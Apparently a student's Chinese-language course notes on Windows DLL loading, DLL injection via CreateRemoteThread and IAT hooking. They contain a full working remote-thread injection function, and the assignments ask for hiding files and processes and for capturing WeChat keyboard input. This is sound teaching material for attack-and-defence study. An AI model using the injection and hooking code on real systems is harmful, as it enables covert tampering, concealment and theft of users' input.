- dll 需要导入表和导出表的配合
  
# run time
- [LoadLibrary](https://docs.microsoft.com/zh-cn/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya?redirectedfrom=MSDN)
- dll文件的入口函数[DllMain](https://docs.microsoft.com/zh-cn/windows/win32/dlls/dllmain?redirectedfrom=MSDN)
  - exe的入口点必须有
  - exe调用dll 可以没有入口点，因为dll导出的加载函数可以使用就行
  - dll的调用和exe的调用不同
    
    EXAMPLE：https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-entry-point-function

    ```c++
    // 能用c就用c 而不用c++
    // 不需要写main函数，因为main函数在exe中
    // 只需要提供基础功能
    #include <Windows.h>
    // 不会被导出
    int intnal_function() {
        return 0;
    }
    // 会被导出
    int lib_function(char* msg) {
        // do some works
        MessageBoxA(0, 
            "msg from base lib", 
            msg, 
            MB_OK);
        return 0;
    }
    BOOL WINAPI DllMain(
        HINSTANCE hinstDLL,  // handle to DLL module
        DWORD fdwReason,     // reason for calling function
        LPVOID lpReserved)  // reserved
    {
        // Perform actions based on the reason for calling.
        switch (fdwReason)
        {
            // 进程加载了Dll后会调用函数，所以调用了两次
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Return FALSE to fail DLL load.
            lib_function("load");
            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            break;
        }
        return TRUE;  // Successful DLL_PROCESS_ATTACH.
    }
    ```

  - 产生两次调用的原因：
    - 第一种加载方式  
    - DLL_PROCESS_ATTACH 只要dll被加载 就会调用这个函数
    - 告诉dll要做一些前期的工作

- 第二种加载方式 run time load
    ```c++
    #include<Windows.h>
    int main() {
        // 第二种加载方式
        // 只调用一次
        HMODULE hBaselib = 
            LoadLibraryA("baselib.dll");
        // 调用两次
        // 获得函数指针
        if (hBaselib == NULL)return 0;
        // 函数指针类型的定义
        FARPROC func =
            GetProcAddress(hBaselib, "lib_function");
        func("run time load");
    }
    ```
  - 函数指针
    - 加载时 函数的原型和我们声明的原型是一样的
    - 没有懂 函数指针是干嘛的的？？？？？？
    - FARPROC
    - 不同数据类型 是不同解释方法
    - 函数指针对象和函数名是相同的使用方法
    - [GetProAddress](https://docs.microsoft.com/zh-cn/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress?redirectedfrom=MSDN)
    - baselib的base.c改成

        ```c++
        int WINAPI lib_function(char*);

        // 不会被导出
        int intnal_function() {
            return 0;
        }
        // 会被导出
        int WINAPI lib_function(char* msg) {
            // do some works
            MessageBoxA(0, 
                "msg from base lib", 
                msg, 
                MB_OK);
            return 0;
        }
        ```
        相应的loader.c要改成
        ```c++
        #include<Windows.h>
        // 数据类型 函数指针类型
        // 函数的返回值 类型名 参数列表
        // WINAPI* MY_PROC WINAPI表示类型
        typedef int (WINAPI* MY_PROC)(char*);

        int main() {
            // 第二种加载方式
            // 只调用一次
            // 加载模块 得到模块的句柄
            HMODULE hBaselib = 
                LoadLibraryA("baselib.dll");

            // 调用两次
            // 获得函数指针
            if (hBaselib == NULL)
                return 0;
            // 函数指针类型的定义
            //FARPROC func =
            //	GetProcAddress(hBaselib, "lib_function");

            MY_PROC func = (MY_PROC)GetProcAddress(
                hBaselib, "lib_function");

            func("run time load");
        }
        ```

# 代码注入技术

让已经成熟的软件，加载一个动态链接库，实现修改这个软件的行为
hacker ->(编写dll 注入运行)-> 正常程序exe(受害者)
dll 恶意代码(功能)
放入dll 让正常程序加载一个恶意的库
例如，浏览器将文件全部加密，勒索软件

**dll劫持 dll inject** 软件攻防技术(上google github搜索)

运行app.exe 会加载同目录下的base.lib
加载的顺序
- 看当前路径下是否有dll，有就加载
- 如果当前路径下无，会去系统目录下找
  - 如kernel32.dll

- [CreateRemoteThread()](https://github.com/fdiskyou/injectAllTheThings)
  - 远程线程创建
  - 两个进程之间的距离 叫remote
    - A进程给B进程创建了一个线程，叫remote
    - 自己给自己创建一个线程，叫local
    - 是否跨进程，为判断标准
    - 跨进程创建线程
    - 跨进程内存读写的机制，调试器中需要读取被调试文件的内容
  - [系统API，官方文档](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
    - Creates a thread that runs in the virtual address space of another process.
    - 在另外一个进程的虚拟内存地址空间当中创建一个线程



```c++
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "fheaders.h"

// 后面的函数给前面的进程注入dll
// processid PID容易获得 tasklist
DWORD demoCreateRemoteThreadW(PCWSTR pszLibFile, DWORD dwProcessId)
{
	// Calculate the number of bytes needed for the DLL's pathname
	DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);

    // 通过传入PID 得到句柄
    // 权限不够可能出错，获得权限
    // 管理员权限 可以对其它进程进行openprocess操作
	// Get process handle passing in the process ID
	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		wprintf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
		return(1);
	}

	// Allocate space in the remote process for the pathname
    // VirtualAllocEx 给别的进程分配内存
	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		wprintf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), dwProcessId);
		return(1);
	}

    // 写入进程
	// Copy the DLL's pathname to the remote process address space
	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
	if (n == 0)
	{
		wprintf(TEXT("[-] Error: Could not write any bytes into the PID [%d] address space.\n"), dwProcessId);
		return(1);
	}

	// Get the real address of LoadLibraryW in Kernel32.dll
	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	if (pfnThreadRtn == NULL)
	{
		wprintf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));
		return(1);
	}

	// Create a remote thread that calls LoadLibraryW(DLLPathname)
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
	if (hThread == NULL)
	{
		wprintf(TEXT("[-] Error: Could not create the Remote Thread.\n"));
		return(1);
	}
	else
		wprintf(TEXT("[+] Success: DLL injected via CreateRemoteThread().\n"));

	// Wait for the remote thread to terminate
	WaitForSingleObject(hThread, INFINITE);

	// Free the remote memory that contained the DLL's pathname and close Handles
	if (pszLibFileRemote != NULL)
		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

	if (hThread != NULL)
		CloseHandle(hThread);

	if (hProcess != NULL)
		CloseHandle(hProcess);

	return(0);
}
```

遍历进程
openprocess
virtualalloc
writeprocess
createthread

遍历当前操作系统中的所有进程
- Process32first
- Process32next 

作业：把这段函数拷贝运行
让指定的进程notepad、calculator 加载baselib的dll

**作业**
1. 查文档，研究远程线程方式注入dll的实例代码的实现原理。
2. 运行实例代码，向一个目标程序（比如notepad.exe)注入一个我们自行编写的dll，加载运行。
3. 整合进程遍历的程序，使得攻击程序可以自己遍历进程得到目标程序的pid。

**解决**
1. 某些函数的文档
- OpenProcess

- VirtualAllocEx
- WriteProcessMemory
- CreateRemoteThread

恶意功能：下载执行、变成肉机

> 实验要求：dll 注入+API hook技术实现对软件行为的篡改，是实现文件或者进程隐藏，外挂等的基础技术。
> API hook : 系统的API函数 替换为一个伪造的函数，从而实现系统函数的修改

## IAT hook

- 重点内容IAT hook 是API hook的一种，API hook是通过修改函数的地址从而达到篡改程序行为的一种技术
- IAT：导入地址表
- hook技术通常与注入技术配合使用
- 链接器可以通过解构可执行文件的方式，结构是公开的，黑客编一个程序去解构PE文件，也可以找到系统文件的指针保存的地址，内存是只要知道了地址就可以往里面写数据（谁都能写能读），坏人把真实的MSGBOX的地址改成假的地址，call 地址（不进行检查），此时运行的程序被劫持，掉入假函数中
- 替换IAT表中 原本存有的真是系统函数的地址，使得程序在调用系统函数的时候，调用了一个假函数，从而达到篡改函数的目的

75xx xxxx - 00xx xxxx -> 2GB ？？？？
0000 0000 - FFFF FFFF -> 4GB 

可以解析PE文件的工具
1. `dumpbin /headers xxx.exe`
2. PE explorer
3. bash `xxd xxx.exe`

PE文件

1. IMAGE_DOS_HEADER

> MZ开头 文件偏移3ch
> e8 偏移
> 一行16个字节
> [PE格式](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format) PE文件格式 找图片

时间戳用计算器的换算 先把十六进制转成秒数

PE explorer没考虑8个小时的时差

2 IMAGE_NT_HEADER

- Image_File_Header
   - Machine
- 可选头
   - 数据目录
   - RVA relative virtual address 相对位置
   - 数组 保存调用api函数时候，应该把api函数放入哪个位置

eip调到当前的反汇编的位置


学习资料
1. [easyhook](https://github.com/EasyHook/EasyHook)
2. [iathook](https://github.com/tinysec/iathook/blob/master/IATHook.c)

# FINAL 作业

API hook的方式进行

- hook writefile 要先调用createfile，如果我们要把写入的haha改为hehe，要hookwritefile，不要hook messagebox
- 把writefile的功能，写成dll，把这个dll注入到notepad的进程中，不能是自己的进程

- findfirstfilenext ？？？ 改的程序注入到cmd，输入回车dir，dir的结果中出现hacker.exe就抹掉，不让他出现，实现文件的隐藏，无法遍历该文件？？

- 遍历进程的方法，taskmanager/tasklist 遍历不到hacker.exe这个进程

- hook textout的函数 setwindowtext 
    - 不改输出，但是可以记录输出，屏幕取词（金山词霸、有道词典）鼠标悬停在单词上

- 接管其他进程的键盘输入，微信进程的文本框输入读取出来

**线程注入技术和IAT HOOK综合运用，实现对系统中进程的修改**

一切都在内存中，在内存中就会被改

